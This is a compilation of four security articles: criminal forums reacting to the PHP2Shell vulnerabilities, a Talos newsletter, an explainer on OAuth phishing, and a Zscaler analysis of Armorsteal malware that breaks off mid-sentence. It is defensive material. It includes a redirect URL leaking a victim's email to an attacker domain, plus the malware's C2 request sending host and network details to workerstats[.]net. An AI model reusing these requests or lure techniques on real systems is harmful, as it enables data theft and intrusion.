Title: The adversary economy: How threat actors are reacting to PHP2Shell
Context: They evaluate this exposure in precisely the same terms as a CISO assessing a critical unpatched vulnerability: the question is not whether someone will attempt exploitation,...
Full Text:
Two critical PHP vulnerabilities sent criminal forum operators scrambling to protect their own infrastructure, revealing that threat actors face the same exposure management challenges as the organizations they target.

Key takeaways

The adversary economy operates on the same fundamental principles as the legitimate economy.

Forum self-evacuations: Criminal forums including BreachForums initiated emergency infrastructure migrations, taking themselves offline within hours of PHP2Shell disclosure, citing direct risk to their operations.

Underground operators face a dual threat: both law enforcement and rival criminal groups could weaponize PHP2Shell against forum infrastructure storing member identities, private communications, and stolen credentials.

The adversary response mirrors legitimate enterprise incident response, including emergency patching, platform migration, and business continuity planning.

Historical precedent from the 2024 BreachForums seizure conditioned criminal operators to treat infrastructure vulnerabilities as existential business risks

Background

PHP powers an estimated 75% of websites with identifiable server-side technology, making it the backbone of the modern web. That infrastructure extends far beyond legitimate businesses. Criminal forums, dark web marketplaces, and underground communication platforms rely on the same PHP-based software stacks, such as phpBB, custom forum engines, and web-based administration panels, that power their legitimate counterparts.

On Oct. 20, 2026, two critical unauthenticated remote code execution vulnerabilities in PHP were publicly disclosed: CVE-2026-109618 (OOM Corruption) and CVE-2026-109619 (Stale Global State), each carrying a CVSS v4.0 score of 9.2. The two flaws target different stages of PHP’s memory management, and chaining them together yields a more reliable exploitation path than either alone. Researchers credit frontier AI models with both the initial discovery and the exploitation chain connecting them. Tenable Vulnerability Watch classified both as Vulnerabilities of Concern (VOC). Within hours, the cybersecurity community began its familiar cycle of assessment, patching, and remediation. (For a full technical breakdown, see our blog “php2shell: Frequently asked questions about critical PHP remote code execution vulnerabilities”.)

At the same time, a parallel response was already underway including criminal forum self-evacuations and steps to protect the adversary economy.

“We take our security seriously”

The adversary economy operates on the same fundamental principles as the legitimate economy. Criminal operators invest in infrastructure, manage risk, plan for business continuity, and respond to threats against their operations with the same systematic urgency that any well-run organization would apply. From the credential theft supply chains we documented earlier this year to the infrastructure-level emergency playing out now, a consistent pattern emerges: the underground functions as an economy, and economies have attack surfaces. PHP2Shell affected both sides of the security divide simultaneously, and the underground's response demonstrates that sophisticated threat actors have already internalized the severity of this exposure.

Within 48 hours of PHP2Shell disclosure, administrators across multiple major criminal forums posted emergency notices to their communities. BreachForums, one of the largest English-language criminal marketplaces, posted an advisory that included a phrase familiar to anyone who has read a corporate breach notification: “We take our security seriously.”

The irony is difficult to overstate. A platform best known for trafficking stolen credentials, facilitating ransomware operations, and hosting leaked corporate data deployed the same language that Fortune 500 companies use after their own security incidents. But behind the borrowed corporate-speak was genuine operational urgency.

BreachForums was not alone. DarkForums posted its own shutdown notice: “DF will remain offline until PHP has been patched globally.” PwnForums went dark without explanation. Dread, the Reddit-like platform serving the Tor ecosystem, posted a maintenance notice explicitly naming both CVEs. Several forums temporarily restricted new registrations, and others migrated critical communications to Telegram channels as a contingency measure, treating their PHP-based web platforms as potentially compromised infrastructure.

The dual threat

The urgency behind these evacuations reflects a threat model that legitimate organizations would recognize immediately. Criminal forums run on PHP infrastructure, and that infrastructure stores exactly the kind of data that makes a vulnerability like PHP2Shell catastrophic.

The simultaneous self-evacuation is a significant behavioral indicator. Analysis from DarkOwl, a dark web intelligence firm, highlighted the scope of what sits behind a typical forum’s PHP application layer: member email addresses, IP logs, private messages, financial transaction records, and the very stolen credentials that members uploaded for sale. A successful exploit of a forum’s PHP stack would not merely disrupt the platform. It would expose the identities and operational security of every participant.

Forum operators face a threat that most legitimate businesses do not: the adversary attacks from two directions simultaneously. Law enforcement agencies have demonstrated both the capability and the willingness to exploit criminal infrastructure, as the FBI’s operation against Hive ransomware and multiple forum takedowns have shown. But rival criminal groups represent an equally serious threat. Competing forums, extortionists, and opportunistic hackers all have incentive to breach a rival platform’s database to steal its user base, to extort its operators, or to eliminate competition.

This dual threat transforms a PHP vulnerability from a technical issue into an existential business risk. The criminal underground last evacuated platforms at this scale during the 2024 BreachForums seizure — but that response was triggered by law enforcement action. PHP2Shell marks the first time a technical vulnerability in shared infrastructure provoked the same reaction, a shift suggesting criminal operators now treat their PHP dependency as a systemic single point of failure. They evaluate this exposure in precisely the same terms as a CISO assessing a critical unpatched vulnerability: the question is not whether someone will attempt exploitation, but when.

The BreachForums lesson

That institutional memory was shaped by hard experience. The 2024 FBI seizure of BreachForums demonstrated in concrete terms what happens when criminal infrastructure is compromised.

That seizure resulted in the exposure of operational details, the arrest of the forum’s administrator, and the disruption of thousands of active criminal operations that depended on the platform. For the underground economy, it was the equivalent of a major supply chain breach: a single point of failure that cascaded across an entire ecosystem.

The lesson was absorbed. Criminal operators began treating their web infrastructure as a single point of failure requiring the same resilience planning that legitimate enterprises apply to critical systems. PHP2Shell validated that concern. The two CVEs affect every PHP version below 8.3, meaning that the approximately 59% of internet-facing PHP hosts running end-of-life branches are permanently exposed absent a version upgrade. Criminal forums running older PHP versions face the same impossible math as any enterprise with a large install base of unsupported software: the patch does not exist, and the only remediation is migration.

From defense to offense: the exploit economy

The criminal underground’s relationship with PHP2Shell extends beyond defensive measures. Intelligence reporting indicates that exploit code for both CVEs circulated in private channels before the public embargo lifted, with pre-disclosure exploitation observed as early as Oct. 17 from infrastructure traced to an IP address geolocated in Australia.

The exploit development pipeline has accelerated in ways that should concern every organization running PHP. Researchers have documented the use of AI-assisted vulnerability analysis tools to accelerate the development of working exploits and to identify additional exploitation vectors within the disclosed vulnerability classes. This represents a broader trend in which the same AI capabilities that accelerate defensive security research simultaneously compress the window between disclosure and weaponization.

The monetization forecast follows a pattern we have documented before. The developer credential economy operates through three layers (generation, distribution, and weaponization), and PHP2Shell maps cleanly onto each. Initial access brokers will package PHP2Shell exploitation into their service offerings. Ransomware affiliates will incorporate the vulnerabilities into their initial access playbooks. And the criminal forums that patched their own infrastructure will become the marketplaces for selling access to organizations that did not. We saw a preview of this commoditization cycle during the Miasma campaign, where open-sourced attack toolchains accelerated exploitation at scale. The adversary economy is efficient: the same operators who scrambled to protect their own PHP stacks will profit from organizations that fail to do the same.

What this means for defenders

The criminal underground’s reaction to PHP2Shell is, paradoxically, one of the clearest available signals of the vulnerability’s severity. When threat actors treat a disclosure as an emergency requiring immediate operational response, defenders should calibrate their own urgency accordingly.

Organizations running PHP should treat both CVE-2026-109618 and CVE-2026-109619 as immediate remediation priorities. Every PHP version below 8.3 is affected, and no patches will be issued for end-of-life branches including all of PHP 5.x, 7.x, 8.0, 8.1, and 8.2. For environments where an immediate upgrade is not feasible, compensating controls including web application firewalls, network segmentation, and enhanced monitoring for exploitation indicators should be deployed without delay. The criminals have already patched. The question for every organization is whether they will do the same before the exploit economy catches up.

Identifying affected systems

Title: I had plans for that second
Context: See an interview with Nick Biasini on php2shell defense: Top security headlines of the week 'PHP2Shell' Bugs Signal Red Alert for Security IndustrySecurity teams are scrambling...
Full Text:
Welcome to this week’s edition of the Threat Source newsletter.

Here for the latest on the PHP vulnerabilities? Head on down to ‘The One Big Thing’. Talos has published a blog to explain what we know so far, and details the Snort coverage available, including rules in the Community Ruleset.

But if you want a bit of levity, here’s what I wrote before everything kicked off yesterday:

Ever feel like the world is moving too fast to keep up? Well, I bring you scientific proof that it’s not just you.

For millions of years, the moon has been slowing down the Earth’s rotation. But over the past decade, we’ve been speeding up (I KNEW I was aging faster than before). Apparently, changes in the Earth’s core are involved (either that, or the 1978 Superman film was a documentary).

This is all causing massive headaches for the people responsible for keeping time. They’re officially called “The International Bureau of Weights and Measures”, but I’m going to call them “The Time-Keepers”. For nerd reasons).

The issue is that the atomic clocks that power so many of our systems, and the rotation of our planet, don’t always agree. Atomic clocks keep extremely consistent time, while each Earth day is rarely the same length as the next. Atomic timekeeping absolutely cannot stand that level of flexibility (have a watch of our “The Light We Keep” documentary to see the importance that accurate clocks have on critical infrastructure).

To keep Coordinated Universal Time (UTC), which is based on atomic clocks, aligned with Earth’s rotation, we introduced a “leap second” in 1972. This system allows for an extra second to be added, or taken away, when we stray too far from atomic time.

A few days ago, The Time-Keepers voted to officially abolish the leap second. Why? Well, there’s a few parts to it.

For the past 54 years, we’ve never once had a second removed from our lives. They’ve always been added (27 of them to be precise). I myself have experienced 20 of these extra seconds. If I’d have known that, I’d have used them more wisely. Like thinking before saying, “Love you too!” to the post-person this morning.

That added time, while it seems nice to have on the surface, can wreak havoc with our modern technology systems. In 2012, the extra second caused so much confusion that it crashed Reddit, among other systems.

The recent speeding-up of the Earth’s rotation complicates things further. If we keep going at this rate, it could result in the world’s first ever “negative second”. If you thought our technology systems struggled with added time, there are a lot of sciency brains who are very worried about the impact of taking time away. One of those concerns being… it’s never been done before.

So, what’s The Time-Keeper’s solution? Invent more time! Woooo.

Starting next May, the leap second will be replaced with a "leap hour," allowing UTC to diverge from Earth's rotation by up to an hour before a correction is made. None of us will get to experience that extra hour in our lifetimes, but our Great, Great, Great, Great, Great, Great, Great, Great, Great, Great, Great grandchildren are going to have one hell of a party.

For us current mortals, we’re all getting a little less time, and we’re hurtling through space a little faster. Happy Thursday!

But I guess I do want to make the point that I’m glad the risk has been thoroughly assessed ahead of, ahem, time. The Time-Keepers have decided that the world’s infrastructure should not have to find out how it handles a missing second by collectively experiencing one.

And I don’t even want to think about how all the AIs would cope with a negative second…

There’s something here for incident response planning. “It’s never happened before” is an excellent reason to test whether you’re ready for it. Run the exercise. Find out which part of your plan depends on something that, in this scenario, is also broken. Preferably before an adversary gets to supervise the practical demonstration.

Now, if only the Time-Keepers can abolish Daylight Savings Time next...

The one big thing

Two unauthenticated remote code execution (RCE) flaws were discovered in PHP, rocking the internet. Dubbed "php2shell" and triggered by a simple HTTP request, this vulnerability affects every build since 5.4. Talos assesses that all industries running PHP applications are at risk for exploitation if systems remain unpatched.

Why do I care?

PHP runs WordPress, Drupal, Magento, Shopware, WooCommerce, and many other ubiquitous internet staples, so the possible blast radius is enormous. Older branches are end of life (EOL) and will not receive patches; these could account for around 50% of use cases.

So now what?

Cisco customers are covered with the Cisco Talos Network Intrusion Prevention (SNORT®) signatures 67359 and 67360. If your organization is running PHP 8.1 or older, Talos very strongly advises immediate update to PHP 8.2 or later. There is no patch for PHP 8.1 or older. Title: The Current Landscape of OAuth Attacks
Context: Rather than only stealing credentials, attackers have shifted to stealing Open Authorization (OAuth) tokens, the keys that govern what applications can do on your behalf
Full Text:
As enterprises continue to roll out multi-factor authentication (MFA), attackers have adapted. Rather than only stealing credentials, attackers have shifted to stealing Open Authorization (OAuth) tokens, the keys that govern what applications can do on your behalf. Adversaries are already accelerating these attacks by using dynamic evasion code, phishing-as-a-service (PhaaS) templates and LLM-generated brand impersonations.

Because OAuth attacks occur at the authorization layer after user authentication, stolen access and refresh tokens bypass MFA, survive password resets and grant durable access.

While OAuth misuse occurs at a lower volume than traditional phishing attacks, these attacks may carry severe consequences such as:

Account takeover

Persistent access to sensitive data that survives password resets and MFA re-enrollment

Lateral movement across every service connected to the compromised identity

Data exfiltration without triggering credential-based alerts

A foothold in enterprise environments for broader supply chain or insider attacks

Defending against these threats can be accomplished using several strategies:

Disabling end-user app consent for vague or impersonating app names

Enforcing admin-only approval workflows

Monitoring authorization code clipboard events

Continuously auditing registered redirect_uri values

To understand why OAuth has become such a prime target for modern adversaries, it helps to examine the authentication challenges the protocol was originally designed to solve. Looking back at how applications handled identity before OAuth reveals how the threat landscape has evolved from simple password theft to complex token hijacking.

The Past: Phishing for Passwords

Websites and applications often tie together functionality from other sites. For example, some popular ecommerce and social media platforms allow users to log in through their email accounts.

In 2006, before OAuth, combining functionality between applications involved sharing one application’s credentials, which are supposed to be secret, with another. This type of sharing is a significant security issue because it increases the consequences of a successful credential phishing attack.

In credential phishing, attackers trick users into sharing their login credentials, allowing attackers to gain full access to their accounts. This could be access to an email account, business system, social media account or bank account. The attacker gains access to all of the information in that account and the authority to make changes, including altering the password and locking out the user.

During the pre-OAuth era, applications or sites sharing credentials meant that attackers could pivot to different platforms or services through compromising a single account.

To address these issues, the OAuth working group released the first draft of OAuth Core 1.0 in 2007. The Internet Engineering Task Force (IETF) released Request for Comments (RFC) 6749 for OAuth 2.0 in 2012 and is working on OAuth 2.1 as of 2026.

The Present: Why OAuth Became the New Attack Surface

The OAuth Framework

OAuth allows users to grant third-party applications passwordless authorization to their data on another service. Figure 1 displays a sample sign-in screen presenting OAuth authentication options with three different Identity Providers (IdPs): Google, Apple and Microsoft.

In a typical OAuth flow:

The user authenticates with the identity provider

The user approves the permissions (i.e., scopes) requested by the third-party application

The identity provider issues an access token to the third-party application

The third-party application then uses the access token to retrieve user data within the authorized scopes

This token is temporary, revocable and has scoped permissions. This gives the third-party application access to permitted resources on the user’s behalf.

OAuth Becomes the New Attack Surface

Standard phishing attacks are designed to steal login credentials like user account names and passwords. OAuth-based phishing bypasses login credential authentication entirely.

Victims authenticate through legitimate IdPs and complete MFA. They are then redirected with tokens that can grant attackers persistent, durable access.

Attackers don’t need to defeat MFA directly, because they are able to bypass it by acquiring the authorization tokens after a victim authenticates. This presents a weak spot between authentication and authorization where OAuth-based phishing can happen. If someone is the victim of a phishing campaign, their stolen tokens may give unintended permissions to an attacker’s app.

A large-scale analysis of OAuth websites found that 18.53% of these sites request permissions beyond the minimum required (typically just a user's profile and email). While not directly malicious, this statistic illustrates the likelihood of privacy and privilege leaks when excessive permissions are granted.

The Core Vulnerability: Tokens Outlive Passwords

One of the primary advantages of OAuth is that tokens, unlike passwords, are designed to be short-lived and easily revoked. However, in practice, OAuth tokens:

Are frequently configured to be long-lived

Survive a password reset since the token is not a password

Bypass MFA since the victim already completed MFA during the flow

Provide persistent access (until explicitly revoked) since refresh tokens silently mint new access tokens for days or months after the initial compromise

This persistence directly amplifies the following authorization vulnerabilities:

Cross-User OAuth Session Fixation (COSF)

Cross-Tenant Client ID Confusion

Cross-Connector OAuth Account Takeover

COSF allows an attacker to use a long-lived token as a permanent backdoor. This type of vulnerability arises when an OAuth session is used to complete an authentication flow without verifying its strict binding to the initiating user’s identity.

The attacker initiates an OAuth process (e.g., “Connect your Slack”) inside a target app

Before completing the OAuth process, the attacker freezes the session and sends the victim a phishing link

The victim logs into their real Slack account, but through the attacker's fixated session

The resulting access token lands in the attacker's account

The next two vulnerabilities rely on OAuth-as-a-service (OaaS). OaaS lets organizations outsource token management to a centralized cloud provider where the provider creates a single token vault and manages tokens for hundreds of different apps (tenants). These are commonly used by organizations with many applications. OaaS architecture is inherently susceptible to Cross-Tenant Client ID Confusion and Cross-Connector OAuth Account Takeover.

Cross-Tenant Client ID Confusion

In Cross-Tenant Client ID Confusion, a malicious app (Tenant A) swaps its app identifier (Client ID) to impersonate a trusted app (Tenant B) sharing the same vault. The vault trusts both tenants, processes the request under the trusted app's context and accidentally exposes access to the malicious tenant.

Cross-Connector OAuth Account Takeover

In Cross-Connector OAuth Account Takeover, a malicious tenant manipulates how the vault maps OAuth sessions to connectors. A victim's authorization flow, meant for a different app entirely, gets rerouted into the attacker's control. As a result, attackers take over the full account without stealing credentials

Both attacks get easier the longer a token stays valid. A short-lived token limits the damage window.

Existing Mitigations

OAuth security is decentralized and dictated by the IdP. While major IdPs have robust defenses against flow misuse, many smaller platforms offer weak protections.

The root challenge is the lack of a global registry for Client IDs. Without a universal ground truth of identity, attackers can easily impersonate legitimate app names on lax platforms. To counter this, leading IdPs enforce strict guardrails. Google, for example, mitigates misuse through:

Domain ownership verification for redirect URIs

Unverified app warnings to deter users from unauthorized integrations

Strict security audits for apps requesting sensitive scopes

Because you cannot rely on every IdP to protect your data equally, a third-party consent security policy is essential. A centralized, automated policy enables organizations to standardize their defenses by:

Enforcing least-privilege

Blocking unverified apps

Revoking risky grants uniformly, regardless of the individual provider's security gaps

OAuth-Based Phishing Campaigns

Currently, OAuth-based phishing campaigns fall into three categories, each defined by what the attacker is trying to achieve:

Account hijacking: The attacker obtains a durable token granting them the same access as the victim (full identity assumption)

Permission hijacking: The victim is tricked into consenting to a malicious app, giving the attacker scoped access to specific resources

Malicious redirect: The attacker uses the OAuth flow's redirect mechanism to deliver malware or phishing, exploiting the trust users place in flows that originate from real identity provider domains

Account Hijacking: Stealing the Identity Itself

Account hijacking is the most complete form of identity compromise. The attacker ends up with an OAuth access or refresh token that authenticates them as the victim on every downstream service that trusts that identity provider. Attackers misuse two distinct OAuth flows to achieve account hijacking: the device authorization flow and the authorization code flow.

Device Authorization (DeviceAuth) Misuse

How the Legitimate Flow Works

The device authorization grant was designed for devices that cannot open a browser such as smart TVs, gaming consoles and command-line tools. The device displays a short code and a URL (like microsoft[.]com/devicelogin). The user opens that URL on a separate device, enters the code, signs in and the original device receives an access token.

How Attackers Exploit It

Instead of a legitimate device requesting the code, the attacker's server requests it. The attacker then shows that code to the victim and instructs them to paste it into, for example, Microsoft's real device login page. When the victim signs in and submits the code, they are unknowingly authenticating the attacker's session.

Authorization Code Theft via Benign Apps

How the Legitimate Flow Works

In the standard authorization code flow, a user authenticates with an identity provider, which issues a short-lived authorization code and redirects the browser to a registered redirect_uri. The application then exchanges that code for an access token in a server-to-server call the user never sees.

How Attackers Exploit It

Attackers use a legitimate application's redirect_uri to expose the authorization code in the browser, then use social engineering to extract it. No malicious app registration is needed; the attack rides on apps that already pass every security check.

Permission Hijacking: Tricking Users into Granting Access

Permission hijacking is more of a surgical attack than a full account takeover. Rather than stealing a code or device token, the attacker's goal is to have the victim click Allow on an OAuth consent screen that grants an attacker-registered application persistent, scoped access to specific resources. The victim authenticates legitimately and completes MFA. They simply consent to the wrong application.

The consent screen is the attack surface. Victims reach it through two attack strategies: vague app names or brand impersonation.

Vague App Names

In this strategy, the attacker registers an application with an innocuous-sounding name (e.g., Privacy Policy Extension or Security App) that provides no meaningful signal about its intent. It then requests permissions far beyond what the name implies.

Brand Impersonation

In this strategy, the attacker registers an application that displays as a trusted brand while the underlying client_id belongs to an attacker-controlled application. The consent screen shows the name provided at registration rather than any verified identity. As such, the victim sees a familiar brand name from a legitimate identity provider, with no visible signal that the application is fraudulent.

Malicious Redirect: Weaponizing the OAuth Flow for Delivery

In malicious redirect attacks, the attacker's goal is not account access or a scoped token. Instead, they weaponize the OAuth authorization flow itself as a delivery mechanism, exploiting the trust users place in pages and redirects that originate from real identity provider domains.

Attackers have used different tactics to weaponize the OAuth flow, such as:

Impersonating trusted services

Triggering OAuth errors

Leveraging less safe IdPs

Impersonating Trusted Services

Attackers register OAuth applications that impersonate trusted services and configure attacker-owned domains as the redirect_uri. When the victim completes the OAuth flow on the real identity provider, the browser is redirected to the attacker's domain as part of the normal protocol. Because the user just interacted with a legitimate identity provider and expects to land somewhere, the redirect is implicitly trusted.

Triggering OAuth Errors

Documented by Microsoft in March 2026, a more covert campaign exploits how identity providers handle errors to redirect users to attacker-controlled malicious landing pages. Attackers crafted authorization URLs designed to deliberately trigger an authentication error. For example, they combined prompt=none with parameters that required user interaction, creating an irresolvable conflict.

When the identity provider cannot complete the authorization, it does not show an error page. Instead, it appends error parameters to the redirect_uri and sends the browser there automatically. An example of a redirect URL format after triggering an error is as follows:

<attacker-domain>/security/?state=<encoded-victim-email>&error=interaction_required&error_subtype=access_denied

Since the crafted link points to a trusted OAuth provider, the user is more likely to click it and be exposed to the malicious content with just that one click.

Leveraging Less Safe IdPs

Attackers weaponize lax validation on less secure IdPs to execute redirection attacks. For example:

If an IdP fails to validate the presence of a client_id, attackers can weaponize the authorization server as a generic open redirector without even creating a malicious OAuth app

If an IdP has a permissive redirect_uri validation, attackers may leverage path traversal or URL parameters to redirect to their own malicious domains

The Escalation: Shift From Basic to Sophisticated Methods

Credential phishing generally relies on mass-delivered, low-fidelity landing pages designed to capture plaintext passwords. Today, attackers have evolved from only harvesting static secrets to hijacking active, authenticated sessions. By positioning themselves inside legitimate OAuth protocols, campaigns can bypass perimeter controls, turning the trust mechanisms of single sign-on (SSO) and federation into vectors for compromise.

From Static Pages to Dynamic Evasion

Security architectures have in the past heavily relied on static analysis and domain reputation to block malicious links. In response, threat groups shifted from static HTML templates to dynamic, highly evasive client-side execution environments.

Key characteristics of this shift include:

Runtime decryption: As observed in recent campaigns, threat actors deliver payloads as obfuscated blobs (using encryption algorithms such as AES-GCM) via edge infrastructure like Cloudflare Workers. The payloads assemble the interface only after execution in the victim's browser. Figure 2 below shows a code snippet from an example of a phishing page.

Active environment fingerprinting: Phishing pages now query the browser environment, implementing heuristics to detect developer tools, automated sandbox configurations or headless security crawlers.

Defensive evasion loops: When the payload detects a monitoring tool or security analyst is detected, the page shifts its behavior, invoking endless debugger loops or silently routing traffic to legitimate domains to preserve the longevity of the infrastructure. Figure 3 shows an example of code used for this type of monitoring.

The PhaaS Economy

The effectiveness of these campaigns is amplified by the commercialization of specialized threat kits within the cybercriminal underground. We observed that the attackers use the same template to generate OAuth phishing pages impersonating different brands. We show examples of different brand impersonations in Figure 4.

This PhaaS ecosystem has two key characteristics:

Modular templates: PhaaS platforms now offer plug-and-play OAuth components. A single underlying framework can be dynamically re-skinned with different corporate assets. We have observed attackers impersonating multiple popular document sharing platforms as part of campaigns.

Shared infrastructure: Multiple seemingly distinct campaigns share identical tokens. We have observed identical data used for anti-bot tokens (example in Figure 5) and Cloudflare Real User Monitoring (RUM) tokens. This indicates that specialized developers are renting highly capable infrastructure to a broader array of less technical affiliates.

LLMs as an Attack Accelerator

Generative AI has lowered the barrier of entry for executing high-fidelity, targeted identity operations. We have observed signs of websites generated with the help of LLMs, such as the example below in Figure 6. The code in these phishing pages suggests that attackers are using LLMs to impersonate legitimate pages and rapidly deploy attacks.

The operational advantages provided by LLMs include:

High-fidelity brand impersonation: Attackers leverage LLMs to overcome typical signs of impersonation, such as poor syntax, unnatural phrasing or layout inconsistencies. Generative models enable adversaries to rapidly produce context-specific localization, creating more convincing brand imitations that can mislead users.

Rapid deployment cycles: Rather than relying solely on static templates or manual development, threat actors can leverage LLMs to generate functional landing page code tailored to specific target organizations. This allows attackers to build targeted, localized campaigns and test and deploy attacks at a velocity that reactive defense layers struggle to match.

Expanding OAuth Ecosystem

OAuth adoption continues to grow beyond identity providers into infrastructure platforms, and every new platform that joins the ecosystem adds a new consent surface for attackers to exploit. A notable recent example is Cloudflare's June 2026 launch of self-managed OAuth clients, which now allows third-party developers to build applications that act on behalf of users to access their Cloudflare accounts.

Cloudflare accounts control critical infrastructure such as DNS, CDN routing and edge compute. This means a token granted through a malicious OAuth app carries a far greater impact radius than one granting access to email or files. An attacker who tricks a developer into consenting could gain the ability to deploy malicious pages, redirect legitimate traffic or build phishing infrastructure on domains that most enterprise security tools inherently trust.

How to Defend Against OAuth Attacks

Standard perimeter and client-side security controls fail against OAuth phishing attacks, particularly for the following reasons:

Access tokens survive a password reset

The attack bypasses MFA because the victim has already completed MFA during the legitimate flow

Conditional Access and IP firewalls fail because OAuth grants access to any token presenter, regardless of origin

Unlike a typical login where a server might establish a persistent, multi-factor session bound to a specific user's browser, the server validates the token's cryptographic signature. However, the session lacks an inherent link to the user's initial authorization context. Additionally, because flows like device authorization intentionally decouple the initiating and authenticating devices, enforcing strict IP or device consistency checks would break the protocol's design.

Effective defenses must focus on account hijacking, permission hijacking and malicious redirects.

Defenses for Account Hijacking

Attackers rely on manipulating victims into pasting sensitive codes into legitimate portals such as device login pages or messaging applications. Security tools can monitor for clipboard copy and paste events along with the source and target of these events. For example, if code is copied from an untrusted source, the tool can flag this anomaly and alert the user before token generation occurs.

Defenses for Permission Hijacking

Organizations can combat consent phishing through strict name-checking and mandatory user consent rerouting. Security posture management tools must enforce policies that automatically block consent requests from apps with vague or impersonating names. Ultimately, enterprises should disable end-user consent for third-party integrations entirely, routing all requests through an admin consent workflow where security teams can review and prune excessive scopes before authorization.

Defenses for Malicious Redirects

To prevent attackers from weaponizing OAuth callback URLs to deliver malware or steal credentials, organizations must mandate redirect destination audits. This requires a continuous, automated inventory of all registered applications to ensure every configured redirect_uri points to verified domains. Any app attempting to register an external, recently created or unmanaged domain as a callback target must be automatically quarantined to neutralize redirect exploitation.

User awareness is the final line of defense against social engineering. Employees must treat OAuth consent screens with the same scrutiny as password fields. They should not grant permissions to apps with vague names or excessive scopes and avoid copy-paste authorization or device codes into unverified chat applications.

Conclusion

OAuth-based phishing represents a fundamental shift in our threat landscape. Attackers no longer need to steal credentials when they can harvest tokens that bypass MFA entirely and persist through password resets.

Defending against this threat requires visibility where the attack happens:

In the browser

At the moment of authorization

Before a token is ever issued

Organizations that wait for credential-based alerts or rely solely on post-authentication controls will find themselves unable to see these attacks. In our next blog, we’ll discuss how OAuth attacks are expected to evolve, especially with AI agents.

Title: SEO Poisoning Campaign Delivers New Armorsteal Malware
Context: This capability allows the threat actor to update the malware's embedded C2 domain list and configuration
Full Text: IntroductionIn September 2026, Zscaler Threat Hunting identified an SEO poisoning campaign that used fake websites impersonating the Chocolatey package manager and the Microsoft Activation Scripts (MAS) tool to distribute a Python-based malware family we track as Armorsteal. The fake websites targeted users searching for Chocolatey or MAS software installation commands. Each lure page displayed a malicious PowerShell command that downloaded and executed the Armorsteal installer. The installer deployed a Python 3.11 runtime environment and three main components providing remote access, surveillance, and information stealing capabilities, with the Python code protected by Pyarmor.The remote access component communicates with a command-and-control (C2) server, downloads additional modules, and executes remote tasks. The surveillance component logs keystrokes, monitors the clipboard, captures screenshots, and displays fake cryptocurrency wallet notifications. The information stealing component targets browser data, Discord tokens, cryptocurrency wallets, seed phrases, saved passwords, SSH keys, and Steam data.In this blog post, the Zscaler Threat Hunting team traces the campaign from poisoned search results through post-infection activity, including Armorsteal's components, C2 communication, and infrastructure changes observed during our analysis. Key TakeawaysIn September 2026, the Zscaler Threat Hunting team identified an SEO poisoning campaign that distributed Armorsteal through websites impersonating Chocolatey and the Microsoft Activation Scripts (MAS) tool.The SEO campaign targeted users searching for Chocolatey installation instructions or Microsoft activation scripts.The remote access component verifies RSA-2048 signatures on Python tasks received from the C2 server before executing them.The surveillance component records window titles, logs keystrokes, monitors copied cryptocurrency wallet addresses, and captures screenshots when configured keywords are detected.The information stealing component steals Discord tokens, browser cookies, saved passwords, cryptocurrency wallet data, BIP39 seed phrases, and SSH keys. Technical AnalysisThe following sections provide details about the malware distribution, capabilities, and network communications.SEO poisoningZscaler Threat Hunting identified two SEO poisoning lures that targeted users searching for Windows software installation instructions. One of those lures is shown in the figure below.Figure 1: Google search results for “chocolatey install windows”. Fake Chocolatey websiteThe first lure (seen in Figure 1) targets users looking for the Chocolatey package manager. A user searching for terms such as “install Chocolatey” and “Chocolatey PowerShell” may reach a typosquatted site impersonating chocolatey[.]org. The site displays a PowerShell installation command. When the user runs it, the malicious install.ps1 script downloads and installs the remote access module. The script also runs the legitimate Chocolatey installer, so Chocolatey appears to function as expected. The fake Chocolatey website and the malicious domain, choclatey[.]org, are shown below:Figure 2: Fake Chocolatey website distributing Armorsteal. Fake Massgrave websiteThe second lure targeted users searching for terms such as “Microsoft Activation Scripts,” “MAS activation script,” or “Massgrave activation”. These users may have reached massgravel[.]net, a malicious website impersonating the Microsoft Activation Scripts tool (a.k.a., the Massgrave project). The fake Massgrave website is shown in the figure below:Figure 3: Fake Massgrave website distributing Armorsteal.Although the two websites impersonate different projects and target different search queries, both deliver Armorsteal.ANALYST NOTE: The fake Massgrave website went down on September 25, 2026, and the fake Chocolatey website went down around October 1, 2026. Installation and persistenceBoth installer variants request elevated privileges, hide the PowerShell console window, and download a ZIP archive to C:\Windows\SystemHealth\Update\ to mimic a legitimate Windows system directory. The archive contains a Python 3.11 runtime, Pyarmor runtime files, and Armorsteal Python-based scripts.The installer creates the following scheduled tasks for persistence:Scheduled taskTriggerDescriptionSysCheck2User logonLaunches the remote access module with the highest privileges available.SysCheckXSystem bootLaunches the remote access module as SYSTEM after a 45-second delay.Table 1: Armorsteal scheduled task persistence.Anti-analysis techniquesArmorsteal uses the following techniques to avoid research environments and complicate analysis:The remote access module checks the public IP address and organization information using ipinfo[.]io. If the organization name returned matches a cloud provider such as Google, Amazon, Microsoft, or Azure, the module displays a fake “Memory is insufficient” message and exits. This can prevent the malware from running in some cloud-based analysis environments.The Python scripts are protected with Pyarmor 9.1.7 (trial version). Pyarmor encrypts Python bytecode and string constants, making static analysis and detection more difficult. The trial runtime is operationally useful to the threat actor because it provides code obfuscation without requiring a commercial Pyarmor license.Remote access moduleThe Armorsteal remote access module is stored as SysMon.py and is launched by the SysCheck2 and SysCheckX scheduled tasks. The module collects information about the infected system, including the hostname, operating system, processor, memory, disks, local IP address, public IP address, and network interfaces. It uses the motherboard serial number to create a machine identifier used in C2 communication.The remote access module also downloads and launches the surveillance and information stealing modules. The remote access module uses HTTPS and a hardcoded list of four C2 domains. It checks the availability of each domain before starting C2 communication. The C2 endpoints supported by the remote access module are shown in the table below:EndpointMethodDescription/downloadables/configf.jsonGETChecks whether the C2 server is available based on the HTTP status code 200./receive_infofPOSTSends device information to the C2 server./get-onetime-code/{machine_id}GETRequests a task for an individual victim./get-globalGETRequests a task shared across all infected systems./downloadables/{archive}GETIn earlier builds, downloads the remote access module updates along with the surveillance and information stealing modules.Table 2: The remote access module C2 endpoints.The following example shows the format of the HTTP POST request the remote access module uses to send system information to its C2 server. POST /receive_infof HTTP/1.1 Host: workerstats[.]net User-Agent: python-requests/2.31.0 Content-Type: application/json Content-Length: {CONTENT_LENGTH} { "host_name": "{HOSTNAME}", "ip_address": "{LOCAL_IP}", "public_ip_address": "{PUBLIC_IP}", "mac_address": "{MAC_ADDRESS}", "system": "{WINDOWS_VERSION}", "machine": "{MACHINE_ARCHITECTURE}", "memory": { "total": {TOTAL_MEMORY_SIZE}, "available": {AVAILABLE_MEMORY_SIZE}, "percent": {MEMORY_PERCENTAGE} } }The C2 server responds with the following message:{"message":"Data received and stored successfully"}The remote access module polls its C2 server every 60 seconds for both per-victim and global tasks. The malware verifies every task received using an embedded 